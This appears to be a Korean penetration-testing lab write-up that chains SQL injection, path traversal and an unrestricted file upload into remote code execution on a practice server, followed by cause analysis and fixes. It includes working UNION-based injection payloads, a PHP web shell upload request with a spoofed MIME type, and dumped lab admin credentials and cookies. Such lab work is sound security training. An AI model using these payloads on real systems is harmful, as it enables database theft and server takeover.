# 웹쉘 업로드 → RCE 공격 체인 정리

> ⚠️ **실습 윤리 고지** — 아래는 **진단 동의를 받은 실습 서버(192.168.200.107)**를 대상으로 한 교육 기록이다. 범위 밖 시스템에 대한 적용은 불법이다. 각 취약점의 **원인·대응**을 이해하는 것이 목적.

---

## 취약점 개요

| 항목 | 내용 |
|---|---|
| 대상 서버 | http://192.168.200.107 |
| 취약점 유형 | SQL Injection + 파일 업로드 취약점 (Unrestricted File Upload) |
| 최종 결과 | **RCE (Remote Code Execution)** 달성 |
| 실행 권한 | uid=1(daemon) gid=1(daemon) groups=1(daemon) |

> 단일 취약점이 아니라 **여러 중간 취약점을 엮어(chaining)** 최종 목표(RCE)에 도달한다. 각각은 "중간 위험"이어도 **연결되면 치명적**이라는 게 모의해킹의 핵심 사고방식.

---

## 전체 공격 체인

| 단계 | 내용 | 결과 |
|---|---|---|
| 1 | SQL Injection (UNION-based) | DB 구조 파악 |
| 2 | `hm_admin_tb` 조회 | 관리자 계정 탈취 |
| 3 | 소스코드 다운로드 (Path Traversal) | 저장 경로·검증 로직 파악 |
| 4 | 공지사항 파일 첨부 업로드 | shell.php 업로드 성공 |
| 5 | SQL Injection으로 파일명 확인 | notice_6aec1b7bd335b.php 확인 |
| 6 | 웹쉘 실행 | **RCE 달성** |

---

## 단계별 상세

### 1단계: SQL Injection으로 테이블/컬럼 정보 수집

**취약점 위치:**
```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=
```

**테이블 목록 조회 (UNION-based):**
```
.../mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

> `idx=-6777`로 원래 쿼리 결과를 **비워서**(존재하지 않는 값) UNION 결과만 화면에 뜨게 한다. `NULL` 14개는 **원본 쿼리의 컬럼 수·타입을 맞추기** 위함이고, 데이터를 뽑을 위치에만 `GROUP_CONCAT(table_name)`을 넣어 **여러 테이블명을 한 셀에 몰아서** 출력한다.



**발견한 주요 테이블:**
- `hm_admin_tb` → 관리자 계정
- `hm_coupon_type_tb` → 쿠폰
- `b_notice` → 공지사항 (최종 웹쉘 업로드 성공 지점)
- 

---

### 2단계: 관리자 계정 탈취

**컬럼 조회:**
```
...GROUP_CONCAT(column_name)... FROM information_schema.columns WHERE table_name=0x686d5f61646d696e5f7462-- -
```

> **`0x686d5f...` 는 뭔가:** `hm_admin_tb`를 **16진수(hex)로 인코딩**한 것. 따옴표(`'`) 필터링·공백 이슈를 피하려고 **문자열을 hex 리터럴로 전달**하는 전형적 우회 기법. (`hex('hm_admin_tb')`)



**계정 정보 조회:**
```
...GROUP_CONCAT(admin_mem_id,0x3a,passwd)... FROM hm_admin_tb-- -
```
(`0x3a` = `:` 구분자)


**결과:**
- ID: `conquerer`
- PW Hash: `2b83a3b2e2cae7477080b049d15c23b3` (MD5)


> **MD5**는 솔트 없이 쓰면 레인보우 테이블·크랙에 취약. 관리자 쿠키(`cookie_admin_pass`)에 이 해시가 그대로 쓰여, 뒤 단계에서 **인증 쿠키로 재사용**된다.
> 

---

### 3단계: 소스코드 다운로드로 경로·검증 로직 분석


![](../Images/Pasted%20image%2020261105153145.png)

**파일 다운로드 취약점 활용 (`_core/_download.php`) — Path Traversal:**

```
.../_core/_download.php?file_url=../../_admin/_action&file_name=board.do.php&real_name=board.php
.../_core/_download.php?file_url=../../_core/_common&file_name=var.common.php&real_name=var.php
```


> **Path Traversal(경로 조작):** `../`로 **웹 루트 밖/상위 디렉터리**를 거슬러 올라가 **소스코드 자체를 다운로드**한다. 소스를 손에 넣으면 **업로드 검증 로직의 허점과 저장 경로**를 정확히 알 수 있어, 다음 단계가 쉬워진다. 

![](../Images/Pasted%20image%2020261105153318.png)

![](../Images/Pasted%20image%2020261105153225.png)


**`var.common.php`에서 확인한 저장 경로:**

```php
$NOTICE_URL = "../../_core/_files/notice/"
```


**`board.do.php` 취약한 코드 (확장자 검증 없음):**

```php
// isImageExt() 검증 없음!
$_pic_name = uniqid("notice_");
$_pic_ext  = getFileExtension($_FILES["file_".$i]["name"], true);
$_fObj = fileUpload($_FILES["file_".$i]["tmp_name"], $_pic_name.".".$_pic_ext, $NOTICE_URL);
```


>  **핵심:** 업로드 파일의 확장자를 **그대로 신뢰**해서 저장(`$_pic_ext`를 검증 없이 사용). `isImageExt()` 같은 **확장자 화이트리스트 검증이 호출되지 않음** → `.php` 업로드가 가능해진다.

---

### 4단계: 공지사항 파일 첨부로 웹쉘 업로드

![](../Images/Pasted%20image%2020261105152658.png)

![](../Images/Pasted%20image%2020261105152734.png)

**Burp Suite Repeater 요청:**
```http
POST /_admin/_action/board.do.php HTTP/1.1
Host: 192.168.200.107
Cookie: PHPSESSID=qa2iqrer3f5qg7qb5i0p0u4bg2; cookie_admin_id=conquerer; cookie_admin_pass=2b83a3b2e2cae7477080b049d15c23b3; cookie_admin_name=%EB%93%A4%EC%99%80%EB%94%B0%EB%84%A4; cookie_admin_email=conquerer%40kisec.com; cookie_admin_grade=YYYYYYYYY
Content-Type: multipart/form-data; boundary=----WebKitBoundary

------WebKitBoundary
Content-Disposition: form-data; name="Mode"

up_board_notice
------WebKitBoundary
Content-Disposition: form-data; name="idx"

36
------WebKitBoundary
Content-Disposition: form-data; name="file_1"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------WebKitBoundary--
```

> 📖 **포인트 2가지:**
> 1. `Content-Type: image/jpeg` — **MIME 타입을 이미지로 위장**(서버가 MIME만 검사할 경우 우회). 하지만 실제 내용은 PHP.
> 2. 2단계에서 턴 **관리자 쿠키**(`cookie_admin_pass`=MD5 해시)를 그대로 넣어 **관리자 인증을 통과**시킨다 → 인증과 업로드 취약점의 결합.

**Response:**

![](../Images/Pasted%20image%2020261105152824.png)
```
HTTP/1.1 200 OK
alert('공지사항을 수정하였습니다.');
```

→ **업로드 성공!**

---

### 5단계: SQL Injection으로 저장된 파일명 확인

업로드 시 파일명이 `uniqid("notice_")`로 **랜덤 변경**되므로, 실제 저장된 파일명을 알아야 실행할 수 있다. → 다시 SQLi로 `b_notice` 조회.

**파일명 조회:**
```
...GROUP_CONCAT(file_1,0x3a,real_name_1)... FROM b_notice WHERE idx=36-- -
```

**결과:**

![](../Images/Pasted%20image%2020261105152959.png)
```
notice_6aec1b7bd335b.php : shell.php
```

---

### 6단계: 웹쉘 실행 → RCE 성공

**웹쉘 URL:**
```
http://192.168.200.107/_core/_files/notice/notice_6aec1b7bd335b.php?cmd=id
```

![](../Images/Pasted%20image%2020261105153426.png)

**실행 결과:**
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> 서버 내 임의 명령어 실행 성공 (**RCE 달성**). `?cmd=` 뒤에 임의 명령을 넣어 실행 가능. 권한은 웹서버 구동 계정(`daemon`) — 여기서 **권한 상승**으로 이어지면 서버 완전 장악.

---

## 취약점 원인 분석

### SQL Injection
- `idx` 파라미터 **입력값 검증 없음**
- **Prepared Statement 미사용** (문자열 결합 쿼리)
- UNION-based SQLi로 DB 전체 조회 가능

### 파일 업로드 취약점 (Unrestricted File Upload)
- 공지사항 첨부에서 **확장자 검증 없음** (`isImageExt()` 미호출)
- **업로드 디렉터리에서 PHP 실행 가능** (실행 권한 미제거)
- MIME 타입만으론 방어 불가 (위조 가능)

### Path Traversal
- `_download.php`의 `file_url`에 `../` 필터링 없음 → 소스코드 노출

---

## 대응 방안

| 취약점 | 대응 방안 |
|---|---|
| SQL Injection | **Prepared Statement** 사용, 입력값 검증(정수 캐스팅), 에러 숨김 |
| 파일 업로드 | **허용 확장자 화이트리스트**(jpg/png/gif), MIME+시그니처 이중 검증 |
| 파일 업로드 | **업로드 디렉터리 PHP(스크립트) 실행 권한 제거** ⭐ 가장 확실 |
| 파일 업로드 | 저장 시 **확장자 강제 변환**, 랜덤 파일명 + 웹 루트 밖 저장 |
| 소스코드 노출 | `_download.php` **경로 검증 강화**(realpath 화이트리스트, `../` 차단) |
| 인증 | 쿠키에 **MD5 비밀번호 해시 저장 금지**, 세션 기반 인증 + 솔트 해시(bcrypt) |

![](../Images/Pasted%20image%2020261105172123.png)

![](../Images/Pasted%20image%2020261105183610.png)

> **요약:** SQLi(정보수집) → Path Traversal(소스 확보) → 업로드 검증 부재(웹쉘 투입) → 실행권한 미제거(RCE). **업로드 폴더의 스크립트 실행만 막았어도** 체인이 끊겼다. 방어는 "한 겹"이 아니라 **체인의 모든 고리**에 걸어야 한다.
